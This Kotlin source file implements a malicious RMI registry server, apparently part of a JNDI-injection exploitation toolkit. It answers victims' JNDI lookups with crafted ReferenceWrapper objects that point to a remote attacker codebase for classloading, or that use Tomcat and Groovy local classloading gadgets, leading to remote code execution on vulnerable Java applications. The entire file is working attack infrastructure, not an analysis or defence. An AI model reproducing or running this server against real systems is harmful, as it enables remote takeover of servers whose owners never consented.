package rmi

import com.sun.jndi.rmi.registry.ReferenceWrapper
import sun.rmi.server.UnicastServerRef
import sun.rmi.transport.TransportConstants
import util.*
import java.io.*
import java.net.URL
import java.rmi.server.ObjID
import java.rmi.server.RemoteObject
import java.rmi.server.UID
import javax.naming.Reference

class RMIServer {
    private val port = Option.rmiPort
    private val codebase = URL("http://${Option.address}:${Option.httpPort}/")

    private fun log(text: String) = println("RMI >> ".purple() + text)

    fun run() {
        val server = java.net.ServerSocket(port)
        log("Listening on ${Option.address}:$port".blue())

        while (true) {
            val socket = server.accept().apply { soTimeout = 5000 }
            log("Receive a connection from ${socket.remoteSocketAddress}")

            val input = socket.getInputStream()
            // guaranteed to support mark/reset
            val bis = if (input.markSupported()) input else BufferedInputStream(input)
            bis.mark(4)

            try {
                val dis = DataInputStream(bis)
                val magic = dis.readInt()
                val version = dis.readShort()
                if (magic != TransportConstants.Magic || version != TransportConstants.Version) {
                    socket.close()
                    continue
                }

                val output = socket.getOutputStream()
                val dos = DataOutputStream(BufferedOutputStream(output))

                when (dis.readByte()) {
                    TransportConstants.StreamProtocol -> {
                        dos.run {
                            // acknowledging support for the protocol
                            writeByte(TransportConstants.ProtocolAck.toInt())
                            // EndpointIdentifier (hostname and port)
                            writeUTF(socket.inetAddress.hostName)
                            writeInt(socket.port)
                            flush()
                        }

                        // read EndpointIdentifier from client
                        dis.readUTF()
                        dis.readInt()

                        parseMessage(dis, dos)
                    }
                    TransportConstants.SingleOpProtocol -> parseMessage(dis, dos)
                    TransportConstants.MultiplexProtocol -> {
                        log("MultiplexProtocol is unsupported".red())
                        socket.close()
                        continue
                    }
                    else -> {
                        log("Unknown protocol".red())
                        socket.close()
                        continue
                    }
                }
            } catch (e: Exception) {
                log("Something wrong, closing connection".red())
                socket.close()
            }
        }
    }

    /**
     * Parsing message wrapped within SingleOpProtocol.
     * The SingleOpProtocol is used for invocation embedded in HTTP requests.
     */
    private fun parseMessage(input: DataInputStream, output: DataOutputStream) {
        log("Reading message...")

        when (val op = input.readByte()) {
            TransportConstants.Call -> doRMICall(input, output)
            TransportConstants.Ping -> output.writeByte(TransportConstants.PingAck.toInt())
            TransportConstants.DGCAck -> UID.read(input)
            else -> throw IOException("RMI >> Unknown transport op: $op")
        }
    }

    private fun doRMICall(input: DataInputStream, output: DataOutputStream) {
        val ois = object : ObjectInputStream(input) {
            override fun resolveClass(desc: ObjectStreamClass): Class<*> {
                return when (desc.name) {
                    "[Ljava.rmi.jndi.ObjID;" -> Array<ObjID>::class.java
                    "java.rmi.jndi.ObjID" -> ObjID::class.java
                    "java.rmi.jndi.UID" -> UID::class.java
                    "java.lang.String" -> String::class.java
                    else -> throw IOException("RMI >> Not allowed to read object")
                }
            }
        }

        when (ObjID.read(ois).hashCode()) {
            2 -> handleDGC(ois)
            0 -> handleRMI(ois, output)
        }
    }

    private fun handleRMI(ois: ObjectInputStream, dos: DataOutputStream) {
        val method = ois.readInt()
        ois.readLong()

        if (method != 2) return

        val path = ois.readObject() as String

        dispatch(path, dos)
    }

    /**
     * Write payload into output stream based on path
     */
    private fun dispatch(path: String, dos: DataOutputStream) {
        val rmiKey = path.substringBefore("/")
        val payloadType = path.substringAfter("/")

        dos.writeByte(TransportConstants.Return.toInt())
        val mos = object : ObjectOutputStream(dos) {
            val url = URL("$codebase#$payloadType")

            override fun annotateClass(cl: Class<*>?) = writeObject(url.toString())
            override fun annotateProxyClass(cl: Class<*>?) = annotateClass(cl)
        }.apply {
            writeByte(TransportConstants.NormalReturn.toInt())
            UID().write(this)
        }

        // key 和方法名一致
        val ref: Reference = when (rmiKey) {
            "ref" -> {
                log("Sending remote classloading stub ($payloadType)")
                ref(payloadType)
            }
            "tomcat" -> {
                log("Sending local classloading reference (tomcat)")
                tomcat(payloadType)
            }
            "groovy" -> {
                log("Sending local classloading reference (groovy)")
                groovy()
            }
            else -> throw IOException("RMI >> Payload type not found")
        }

        val refWrapper = createWithoutConstructor(ReferenceWrapper::class.java)
        setFieldVal(refWrapper, "wrappee", ref)

        // set the ref attribute of the wrapper
        RemoteObject::class.java.getDeclaredField("ref").run {
            isAccessible = true
            set(refWrapper, UnicastServerRef(12345))
        }

        mos.writeObject(refWrapper)
        mos.flush()
        dos.flush()
    }

    private fun handleDGC(oiStream: ObjectInputStream) {
        oiStream.readInt()
        oiStream.readLong()
        log("A DGC call for ${oiStream.readObject() as Array<*>}")
    }
}
